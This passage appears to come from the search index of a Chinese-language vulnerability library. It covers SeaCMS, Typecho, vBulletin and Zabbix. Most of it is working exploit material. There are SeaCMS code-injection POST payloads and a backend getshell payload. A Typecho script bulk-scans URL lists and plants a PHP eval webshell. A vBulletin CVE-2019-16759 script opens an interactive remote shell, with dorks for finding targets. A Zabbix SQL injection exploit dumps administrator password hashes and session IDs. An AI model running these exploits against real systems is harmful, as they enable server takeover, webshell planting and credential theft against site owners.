/&gt;\n      &lt;input type=\"hidden\" name=\"admin_auth[0]\" value=\"index/welcome\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"SeaCMS v6.45\u524d\u53f0Getshell \u4ee3\u7801\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#affected-version-645","title":"Affected Version 6.45","text":"<p>\u4e0b\u8f7d\u5730\u5740\uff1a</p> <p>\u94fe\u63a5\uff1ahttps://pan.baidu.com/s/1uw_VnxnvG4GGEae4TRsGGw </p> <p>\u5bc6\u7801\uff1acd48</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","title":"POC","text":"<p><code>http://127.0.0.1/seacms645/search.php</code></p> <p><code>post:searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#references","title":"References","text":"<p>https://bbs.ichunqiu.com/thread-35085-1-1.html\u00df</p> <p>http://0day5.com/archives/4249/</p> <p>https://blog.csdn.net/qq_35078631/article/details/76595817</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"Seacms6.54\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#affected-version-654","title":"Affected Version 6.54","text":"<p>\u94fe\u63a5:https://pan.baidu.com/s/16rV0_xnoN_8-v4WVpCq6YA </p> <p>\u5bc6\u7801:qlwh</p> <p>6.54 \u548c6.53\u7248\u672c\u7684\u4e0d\u540c\u4e4b\u5904\u662f\u5728\uff1a</p> <p><code>search.php</code>\u768465\u884c\u7684<code>order</code>\u53c2\u6570\u505a\u4e86\u9650\u5236\u3002</p> <p><code>$order = ($order == \"commend\" || $order == \"time\" || $order == \"hit\") ? $order : \"\";</code></p> <pre><code>\u66f4\u65b0\u65e5\u671f\uff1a2017\u5e748\u67087\u65e5 v6.54\n\u4fee\u590d\uff1a\u7d27\u6025\u4fee\u590d2\u5904\u9ad8\u5371\u5b89\u5168\u6f0f\u6d1e\n\n\u66f4\u65b0\u65e5\u671f\uff1a2017\u5e748\u67086\u65e5 v6.53\n\u65b0\u589e\uff1a\u5fae\u4fe1\u516c\u4f17\u5e73\u53f0\u6a21\u5757\n\u4f18\u5316\uff1a\u91c7\u96c6\u903b\u8f91\n\u4fee\u590d\uff1a\u90e8\u5206\u6587\u5b57\u63cf\u8ff0\u9519\u8bef\n\u66f4\u65b0\u65e5\u671f\uff1a2017\u5e742\u670818\u65e5 v6.46\n\u4fee\u590d\uff1a\u4e24\u5904\u5b89\u5168\u95ee\u9898\n\n\u66f4\u65b0\u65e5\u671f\uff1a2017\u5e742\u67086\u65e5 v6.45\n\u4fee\u590d\uff1a\u4e00\u5904\u5b89\u5168\u95ee\u9898\n</code></pre> <p>\u200b   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","title":"POC","text":"<pre><code>http://192.168.0.6/seacms654/search.php\nPOST\uff1a\nsearchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.54%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#references","title":"References","text":"<p>\u6f0f\u6d1e\u9884\u8b66 | \u6d77\u6d0bCMS\uff08SEACMS\uff090day\u6f0f\u6d1e\u9884\u8b66</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"Seacms6.55\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#affected-version-655","title":"Affected Version 6.55","text":"<p>\u94fe\u63a5:https://pan.baidu.com/s/1UmbsQjQ4o4JFtK1MLHtf3g \u5bc6\u7801:k4x1</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","title":"POC","text":"<pre><code>http://192.168.0.6/seacms655/search.php?phpinfo(); \npost:\nsearchtype=5&amp;searchword={if{searchpage:year}&amp;year=:as{searchpage:area}}&amp;area=s{searchpage:letter}&amp;letter=ert{searchpage:lang}&amp;yuyan=($_SE{searchpage:jq}&amp;jq=RVER{searchpage:ver}&amp;&amp;ver=[QUERY_STRING]));/*\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.55%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#references","title":"References","text":"<p>\u6d77\u6d0bCMS\uff08SEACMS\uff09\u65b0\u7248\u672cV6.55\u8865\u4e01\u4ecd\u53ef\u88ab\u7ed5\u8fc7\u6267\u884c\u4efb\u610f\u4ee3\u7801</p> <p>seacms 6.55 \u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/","title":"Seacms6.61\u540e\u53f0getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/#affected-version-661","title":"Affected Version 6.61","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/#poc","title":"POC","text":"<p>\u540e\u53f0\u7684\u2192\u6dfb\u52a0\u5f71\u7247\u2192 \u56fe\u7247\u5730\u5740\u2192payload</p> <p><code>{if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if}</code></p> <p>\u8bbf\u95ee</p> <p><code>http://192.168.0.6/seacms661/detail/?1.html&amp;a=assert&amp;b=phpinfo();</code></p> <p><code>http://192.168.0.6/seacms661/search.php?searchtype=5&amp;tid=0&amp;a=assert&amp;b=phpinfo();</code></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/seacms/seacms6.61%E5%90%8E%E5%8F%B0getshell/#references","title":"References","text":"<p>seacms backend getshell</p> <p>CVE-2018-14421\u2014\u2014Seacms\u540e\u53f0getshell\u5206\u6790</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/typeecho/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"Typecho\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/typeecho/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#typecho","title":"typecho\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/typeecho/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u68c0\u6d4b\u4ee3\u7801","text":"<pre><code>#/usr/bin/env python\n# -*- coding: UTF-8 -*-\nimport getopt,sys\nimport requests\nimport sys\nimport string\nimport time\nimport threading\n\nclass check(threading.Thread): \n    def __init__(self, url, sem):\n        super(check, self).__init__()     #\u7ee7\u627fthreading\u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff0cpython3\u7684\u5199\u6cd5super().__init__()\n        self.url = url\n        self.sem = sem\n\n    def run(self):\n        headers = {\n                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',\n                'Referer': self.url,\n                'cookie': \"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==\"\n                }\n        try:\n            reqs=s.get(self.url,timeout=3,headers=headers,allow_redirects=False)\n            #print(reqs.status_code),\n        except IOError:                  #\u5982\u679c\u7f51\u7ad9\u6253\u4e0d\u5f00\u5c06\u8f93\u51fafail\n            print(\"time out 1\")\n        urls=self.url+\"/p0.php\"\n        urlsss=self.url+\"/install.php?finish=1\"\n        payloads={'p0':'echo \"sectest\";'}\n        try:\n            reqss=s.post(urls,allow_redirects=False,timeout=3,data=payloads)#\u6d4b\u8bd5\u662f\u5426\u6587\u4ef6\u521b\u5efa\u6210\u529f\n            body=reqss.text\n            if body.find('sectest')!=-1:\n                 print(\"web is success-----&gt;&gt;&gt;&gt;&gt;&gt;\"+self.url)\n                 with open(\"./success.txt\", \"a+\") as f1:\n                    f1.write(self.url + \"\\n\")\n            else: \n                 print(\"web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;\"+self.url)\n            print('\\n')\n        except IOError:                  #\u5982\u679c\u7f51\u7ad9\u6253\u4e0d\u5f00\u5c06\u8f93\u51fafail\n            print(\"time out 2\")\n        self.sem.release()\n\nif __name__ == '__main__':\n    reload(sys)#\u540c\u4e0b\u89e3\u51b3\u4e2d\u6587\u4e71\u7801\n    sys.setdefaultencoding('utf-8')#\u89e3\u51b3\u4e2d\u6587\u4e71\u7801\n    f = open(\"./1.txt\")#\u6253\u5f00\u6279\u91cf\u626b\u63cf\u7684\u7f51\u7ad9\u6587\u4ef6\n    s=requests.Session()\n    sem = threading.Semaphore(10)      #\u6700\u5927\u7ebf\u7a0b\u6570\u4e3a10\u4e2a\n    for line in f.readlines():#\u8bfb\u53d6\u6bcf\u4e00\u884c\u7684\u7f51\u7ad9\n            line=line.strip('\\n')#\u6d88\u53bb\u6362\u884c\n            url=line#\u6bcf\u884c\u7684\u7f51\u7ad9\u8d4b\u503c\u7ed9url\n            host_thread = check(url,sem)\n            host_thread.start()#\u6267\u884ccheck()\u7684\u6267\u884c\u51fd\u6570\n</code></pre> <p>\u4f7f\u7528\u65b9\u6cd5\uff1a\u5728\u5f53\u524d\u9875\u9762\u4e0b\u521b\u5efa./1.txt\uff08\u4e3a\u9700\u8981\u68c0\u6d4b\u7684url\uff09\uff0csuccess.txt\u4e3a\u542b\u6709\u6f0f\u6d1e\u7684url\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/","title":"CVE 2019 16759 vBulletin 5.x 0day pre auth RCE exploit","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_1","title":"\u524d\u8a00","text":"<p>vBulletin \u662f\u4e00\u4e2a\u5546\u7528\u7684\u8bba\u575b\u7a0b\u5e8f\uff0c\u5728\u5168\u7403\u62e5\u6709\u6570\u4e07\u7528\u6237\u4e14\u589e\u957f\u901f\u5ea6\u5f88\u5feb\u3002\u8be5\u8bba\u575b\u91c7\u7528PHP Web\u8bed\u8a00\u53caMySQL\u6570\u636e\u5e93\u7684\u65b9\u5f0f\u8fdb\u884c\u67b6\u6784\u3002\u300a\u8d22\u5bcc\u300b 500\u5f3a\u548cAlexa\u6392\u540d\u524d100\u4e07\u7684\u516c\u53f8\u7f51\u7ad9\u5927\u90e8\u5206\u90fd\u5728\u4f7f\u7528\u7684\u4e00\u6b3e\u4e92\u8054\u7f51\u8bba\u575b\u7a0b\u5e8f\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>CVE-2019-16759 vBulletin 5.x 0day pre-auth RCE exploit \uff0c\u65e0\u9700\u9884\u8ba4\u8bc1\u5373\u53ef\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u4e0d\u9700\u8981\u5728\u76ee\u6807\u8bba\u575b\u4e0a\u6ce8\u518c\u5e10\u6237,\u5373\u53ef\u5728\u8fd0\u884cvBulletin\u5b89\u88c5\u7684\u670d\u52a1\u5668\u4e0a\u6267\u884cshell\u547d\u4ee4 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_4","title":"\u5f71\u54cd\u8303\u56f4","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_5","title":"\u4ea7\u54c1","text":"<p>vBulletin 5.x </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_6","title":"\u7248\u672c","text":"<p>vBulletin v5\uff085.0.0\u52305.5.4\uff09\u7248\u672c  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_7","title":"\u7ec4\u4ef6","text":"<p>vBulletin  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_8","title":"\u6f0f\u6d1e\u590d\u73b0","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#poc","title":"POC","text":"<pre><code>#!/usr/bin/python\n#\n# vBulletin 5.x 0day pre-auth RCE exploit\n# \n# This should work on all versions from 5.0.0 till 5.5.4\n#\n# Google Dorks:\n# - site:*.vbulletin.net\n# - \"Powered by vBulletin Version 5.5.4\"\n\nimport requests\nimport sys\n\nif len(sys.argv) != 2:\n    sys.exit(\"Usage: %s &lt;URL to vBulletin&gt;\" % sys.argv[0])\n\nproxies ={\n     \"http\":\"http://127.0.0.1:8080/\"\n}\nparams = {\"routestring\":\"ajax/render/widget_php\"}\n\nwhile True:\n     try:\n          cmd = raw_input(\"&gt;&gt;&gt;Shell= \")\n          params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"');echo md5('vBulletin'); exit;\"\n          r = requests.post(url = sys.argv[1], data = params, proxies=proxies)\n          if r.status_code == 200 or r.status_code ==403 and 'be4ea51d962be8308a0099ae1eb3ec63' in r.text:\n               print\n               print r.text.split('be4ea51d962be8308a0099ae1eb3ec63')[0]\n          else:\n               sys.exit(\"Exploit failed! :(\")\n     except KeyboardInterrupt:\n          sys.exit(\"\\nClosing shell...\")\n     except Exception, e:\n          sys.exit(str(e))\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/#_9","title":"CVE 2019 16759 vBulletin 5.x 0day pre auth RCE exploit","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"zabbix 2.2.x, 3.0.0 3.0.3\u7248\u672cSQL\u6ce8\u5165\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>Zabbix \u662f\u7531 Alexei Vladishev \u5f00\u53d1\u7684\u4e00\u79cd\u7f51\u7edc\u76d1\u89c6\u3001\u7ba1\u7406\u7cfb\u7edf\uff0c\u57fa\u4e8e Server-Client \u67b6\u6784\u3002\u53ef\u7528\u4e8e\u76d1\u89c6\u5404\u79cd\u7f51\u7edc\u670d\u52a1\u3001\u670d\u52a1\u5668\u548c\u7f51\u7edc\u673a\u5668\u7b49\u72b6\u6001\u3002\u672c\u7740\u5176\u5f00\u6e90\u3001\u5b89\u88c5\u7b80\u5355\u7b49\u7279\u70b9\u88ab\u5e7f\u6cdb\u4f7f\u7528\uff0c zabbix\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u8d85\u7ea7\u7ba1\u7406\u5458\u8d26\u53f7\u9ed8\u8ba4\u4e3a\uff1a</p> <pre><code>    \u7528\u6237\u540d\uff1aAdmin   \u5bc6\u7801\uff1azabbix\u3002\n</code></pre> <p>\u4e8c\u3001Guest\u7528\u6237   zabbix\u7cfb\u7edf\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u9ed8\u8ba4\u4f1a\u6709\u4e00\u4e2aguest\u8d26\u53f7\uff1a</p> <pre><code>    \u7528\u6237\u540d\uff1aguest   \u5bc6\u7801\u4e3a\u7a7a  \uff0c\u53ea\u80fd\u770b\u5230zabbix\u540e\u53f0\uff0c\u6ca1\u6709\u5177\u4f53\u5185\u5bb9\n</code></pre> <p>\u4f46zabbix 2.2.x, 3.0.0-3.0.3\u7248\u672c\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u65e0\u9700\u6388\u6743\u767b\u9646\u5373\u53ef\u767b\u9646zabbix\u7ba1\u7406\u7cfb\u7edf\uff0c\u8fdb\u5165\u540e\u53f0\u540escript\u7b49\u529f\u80fd\u76f4\u63a5\u83b7\u53d6zabbix\u670d\u52a1\u5668\u7684\u64cd\u4f5c\u7cfb\u7edf\u6743\u9650</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>1.\u8bbf\u95ee\u7684zabbix\u7684\u5730\u5740\u540e\u9762\u52a0\u4e0a\u5982\u4e0burl\uff1a</p> <pre><code>/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;tim\nestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=hi\nstory.php&amp;profileIdx=web.item.graph&amp;profileIdx2=2'3297&amp;updateProfil\ne=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=\n17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;\nmark_color=1\n</code></pre> <p> \u8f93\u51fa\u7ed3\u679c\uff0c\u82e5\u5305\u542b\uff1aYou have an error in your SQL syntax;\u8868\u793a\u6f0f\u6d1e\u5b58\u5728\u3002</p> <p>2.\u9996\u5148\u5728Administration\u9875\u9762\u7684scrpit\u529f\u80fd\u680f\u521b\u5efascript\u5982\u4e0b\uff1a </p> <p>3.\u7136\u540e\u91cd\u70b9\u5728\u4e8e\u627e\u89e6\u53d1\u70b9\uff0c\u627e\u5230\u89e6\u53d1\u70b9\u624d\u80fd\u6267\u884c\u3002\u65b9\u6cd5\u5f88\u591a\uff0c\u8fd9\u91cc\u62ff\u5e38\u7528\u7684\u4e3e\u4f8b\u3002  4.\u6267\u884c\u6210\u529f\u540e\u5373\u53efgetshell\u3002 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#exp","title":"EXP","text":"<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# Date: 2016/8/18\n# Modified by: Jamin Zhang\n\nimport urllib2\nimport sys, os\nimport re\n\ndef deteck_Sql():\nu'\u68c0\u67e5\u662f\u5426\u5b58\u5728 SQL \u6ce8\u5165'\npayload = \"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999'&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1\"\ntry:\nresponse = urllib2.urlopen(url + payload, timeout=10).read()\nexcept Exception, msg:\nprint msg\nelse:\nkey_reg = re.compile(r\"INSERT\\s*INTO\\s*profiles\")\nif key_reg.findall(response):\nreturn True\n\n\ndef sql_Inject(sql):\nu'\u83b7\u53d6\u7279\u5b9asql\u8bed\u53e5\u5185\u5bb9'\npayload = url + \"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=\" + urllib2.quote(\nsql) + \"&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1\"\ntry:\nresponse = urllib2.urlopen(payload, timeout=10).read()\nexcept Exception, msg:\nprint msg\nelse:\nresult_reg = re.compile(r\"Duplicate\\s*entry\\s*'~(.+?)~1\")\nresults = result_reg.findall(response)\nif results:\nreturn results[0]\n\n\nif __name__ == '__main__':\n# os.system(['clear', 'cls'][os.name == 'nt'])\nprint '+' + '-' * 60 + '+'\nprint u'\\t   Python Zabbix &lt; 3.0.4 SQL \u6ce8\u5165 Exploit'\nprint '\\tOrigin Author: http://www.waitalone.cn/'\nprint '\\t\\t   Modified by: Jamin Zhang'\nprint '\\t\\t   Date: 2016-08-18'\nprint '+' + '-' * 60 + '+'\nif len(sys.argv) != 2:\nprint u'\u7528\u6cd5: ' + os.path.basename(sys.argv[0]) + u' [Zabbix Server Web \u540e\u53f0 URL]'\nprint u'\u5b9e\u4f8b: ' + os.path.basename(sys.argv[0]) + ' http://jaminzhang.github.io'\nsys.exit()\nurl = sys.argv[1]\nif url[-1] != '/': url += '/'\npasswd_sql = \"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)\"\nsession_sql = \"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)\"\nif deteck_Sql():\nprint u'Zabbix \u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e\uff01\\n'\nprint u'\u7ba1\u7406\u5458  \u7528\u6237\u540d\u5bc6\u7801\uff1a%s' % sql_Inject(passwd_sql)\nprint u'\u7ba1\u7406\u5458  Session_id\uff1a%s' % sql_Inject(session_sql)\nelse:\nprint u'Zabbix \u4e0d\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e\uff01\\n'\n</code></pre> <p>\u4ee5\u4e0b\u4e3a\u6267\u884c\u4e0a\u8ff0 Exp \u811a\u672c\u8f93\u51fa\u7ed3\u679c\uff1a</p> <pre><code>C:\\Users\\xxx\\Desktop&gt;python zabbix_exp.py\n+------------------------------------------------------------+\n   Python Zabbix &lt; 3.0.4 SQL \u6ce8\u5165 Exploit\n   Origin Author: http://www.waitalone.cn/\n   Modified by: Jamin Zhang\n   Date: 2016-08-18\n+------------------------------------------------------------+\n\u7528\u6cd5: zabbix_exp.py [Zabbix Server Web \u540e\u53f0 URL]\n\u5b9e\u4f8b: zabbix_exp.py http://jaminzhang.github.io\n\nC:\\Users\\xxx\\Desktop&gt;python zabbix_exp.py http://192.168.56.11/zabbix\n+------------------------------------------------------------+\n   Python Zabbix &lt; 3.0.4 SQL \u6ce8\u5165 Exploit\n   Origin Author: http://www.waitalone.cn/\n   Modified by: Jamin Zhang\n   Date: 2016-08-18\n+------------------------------------------------------------+\nZabbix \u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e\uff01\n\n\u7ba1\u7406\u5458  \u7528\u6237\u540d\u5bc6\u7801\uff1aZabbix:5fce1b3e34b520afeffb37ce08c7cd66\n\u7ba1\u7406\u5458  